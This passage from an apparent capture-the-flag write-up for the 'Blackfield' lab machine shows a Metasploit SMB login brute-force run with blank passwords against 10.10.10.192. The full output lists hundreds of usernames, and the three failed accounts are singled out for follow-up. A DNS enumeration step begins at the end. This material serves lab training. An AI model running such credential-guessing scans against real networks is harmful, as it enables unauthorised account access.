+</code></pre><ol start="3">
+<li>Save these profiles to <code>users.txt</code> file. I&rsquo;m gonna use metasploit and run a SMB login scan.</li>
+</ol>
+<pre><code>msf5 auxiliary(scanner/smb/smb_login) &gt; use scanner/smb/smb_login
+msf5 auxiliary(scanner/smb/smb_login) &gt; show options
+
+Module options (auxiliary/scanner/smb/smb_login):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
+   BLANK_PASSWORDS    false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS       false            no        Add all users in the current database to the list
+   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
+   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
+   PASS_FILE                           no        File containing passwords, one per line
+   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
+   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
+   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
+   RHOSTS             10.10.10.192     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT              445              yes       The SMB service port (TCP)
+   SMBDomain          .                no        The Windows domain to use for authentication
+   SMBPass                             no        The password for the specified username
+   SMBUser                             no        The username to authenticate as
+   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
+   THREADS            1                yes       The number of concurrent threads (max one per host)
+   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS       false            no        Try the username as the password for all users
+   USER_FILE                           no        File containing usernames, one per line
+   VERBOSE            true             yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE users.txt
+USER_FILE =&gt; users.txt
+msf5 auxiliary(scanner/smb/smb_login) &gt; set BLANK_PASSWORDS true
+BLANK_PASSWORDS =&gt; true
+msf5 auxiliary(scanner/smb/smb_login) &gt; run
+
+[*] 10.10.10.192:445      - 10.10.10.192:445 - Starting SMB login bruteforce
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AAlleni:'
+[!] 10.10.10.192:445      - No active DB -- Credential data will not be saved!
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ABarteski:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ABekesz:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ABenzies:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ABiemiller:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AChampken:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ACheretei:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ACsonaki:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AHigchens:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AJaquemai:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKlado:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKoffenburger:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKollolli:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKruppe:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AKubale:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ALamerz:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AMaceldon:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AMasalunga:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ANavay:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ANesterova:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ANeusse:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AOkleshen:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\APustulka:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ARotella:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ASanwardeker:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AShadaia:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ASischo:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ASpruce:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ATakach:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ATaueg:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ATwardowski:'
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\audit2020:',
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AWangenheim:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AWorsey:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\AZigmunt:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BBakajza:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BBeloucif:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BCarmitcheal:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BConsultant:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BErdossy:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BGeminski:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BLostal:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BMannise:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BNovrotsky:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BRigiero:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BSamkoses:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\BZandonella:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CAcherman:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CAkbari:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CAldhowaihi:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CArgyropolous:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CDufrasne:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CGronk:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\Chiucarello:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\Chiuccariello:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CHoytal:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CKijauskas:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CKolbo:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CMakutenas:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CMorcillo:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CSchandall:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CSelters:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\CTolmie:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DCecere:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DChintalapalli:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DCwilich:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DGarbatiuc:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DKemesies:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DMatuka:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DMedeme:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DMeherek:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DMetych:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DPaskalev:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DPriporov:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DRusanovskaya:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DVellela:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DVogleson:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\DZwinak:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EBoley:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EEulau:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EFeatherling:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EFrixione:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EJenorik:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EKmilanovic:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ElKatkowsky:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EmaCaratenuto:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EPalislamovic:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EPryar:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ESachhitello:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ESariotti:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ETurgano:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\EWojtila:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FAlirezai:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FBaldwind:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FBroj:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FDeblaquire:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FDegeorgio:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FianLaginja:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FLasokowski:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FPflum:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\FReffey:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GaBelithe:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\Gareld:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GBatowski:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GForshalger:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GGomane:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GHisek:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GMaroufkhani:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GMerewether:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GQuinniey:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GRoswurm:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\GWiegard:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HBlaziewske:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HColantino:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HConforto:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HCunnally:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HGougen:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\HKostova:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\IChristijr:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\IKoledo:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\IKotecky:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ISantosi:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JAngvall:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JBehmoiras:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JDanten:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JDjouka:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JKondziola:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JLeytushsenior:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JLuthner:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JMoorehendrickson:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JPistachio:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JScima:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JSebaali:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JShoenherr:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\JShuselvt:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KAmavisca:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KAtolikian:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KBrokinn:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KCockeril:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KColtart:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KCyster:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KDorney:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KKoesno:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KLangfur:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KMahalik:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KMasloch:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KMibach:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KParvankova:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KPregnolato:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KRasmor:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KShievitz:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KSojdelius:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KTambourgi:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KVlahopoulos:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\KZyballa:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBajewsky:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBaligand:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBarhamand:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBirer:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LBobelis:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LChippel:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LChoffin:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LCominelli:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LDruge:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LEzepek:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LHyungkim:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LKarabag:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LKirousis:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LKnade:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LKrioua:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LLefebvre:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LLoeradeavilez:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LMichoud:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LTindall:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\LYturbe:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MArcynski:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MAthilakshmi:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MAttravanam:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MBrambini:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MHatziantoniou:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MHoerauf:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MKermarrec:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MKillberg:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MLapesh:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MMakhsous:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MMerezio:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MNaciri:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MShanmugarajah:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MSichkar:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MTemko:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MTipirneni:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MTonuri:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\MVanarsdel:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NBellibas:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NDikoka:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NGenevro:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NGoddanti:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NMrdirk:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NPulido:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NRonges:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NSchepkie:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\NVanpraet:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\OBelghazi:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\OBushey:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\OHardybala:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\OLunas:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ORbabka:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PBourrat:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PBozzelle:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PBranti:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PCapperella:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PCurtz:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PDoreste:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PGegnas:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PMasulla:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PMendlinger:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PParakat:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PProvencer:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PTesik:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PVinkovich:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PVirding:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\PWeinkaus:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RBaliukonis:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RBochare:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RKrnjaic:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RNemnich:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RPoretsky:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RStuehringer:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RSzewczuga:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RVallandas:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RWeatherl:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\RWissor:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SAbdulagatov:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SAjowi:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SAlguwaihes:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SBonaparte:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SBouzane:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SChatin:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SDellabitta:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SDhodapkar:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SEulert:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SFadrigalan:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SGolds:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SGrifasi:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SGtlinas:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SHauht:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SHederian:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SHelregel:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SKrulig:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SLewrie:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SMaskil:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\Smocker:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SMoyta:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SRaustiala:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SReppond:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SSicliano:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SSilex:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SSolsbak:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\STousignaut:'
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\support:',
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\svc_backup:',
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SWhyte:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\SWynigear:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TAwaysheh:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TBadenbach:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TCaffo:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TCassalom:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TEiselt:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TFerencdo:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TGaleazza:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TKauten:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TKnupke:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TLintlop:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TMusselli:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TOust:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TSlupka:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TStausland:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\TZumpella:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\UCrofskey:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\UMarylebone:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\UPyrke:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\VBublavy:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\VButziger:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\VFuscca:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\VLitschauer:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\VMamchuk:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\VMarija:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\VOlaosun:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\VPapalouca:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\WSaldat:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\WVerzhbytska:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\WZelazny:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\XBemelen:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\XDadant:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\XDebes:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\XKonegni:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\XRykiel:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YBleasdale:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YHuftalin:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YKivlen:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YKozlicki:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YNyirenda:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YPredestin:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YSeturino:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YSkoropada:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YVonebers:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\YZarpentine:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ZAlatti:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ZKrenselewski:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ZMalaab:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ZMiick:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ZScozzari:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ZTimofeeff:'
+[+] 10.10.10.192:445      - 10.10.10.192:445 - Success: '.\ZWausik:'
+[*] 10.10.10.192:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre><p>Among of many &ldquo;success&rdquo; entries we notice some failures:</p>
+<pre><code>[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\audit2020:',
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\support:',
+[-] 10.10.10.192:445      - 10.10.10.192:445 - Failed: '.\svc_backup:',
+</code></pre><ol start="4">
+<li>Run DNS enumeration:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dnsrecon -d BLACKFIELD.local -n 10.10.10.192
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Performing General Enumeration of Domain: BLACKFIELD.local
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DNSSEC is not configured <span style="color:#66d9ef">for</span> BLACKFIELD.local
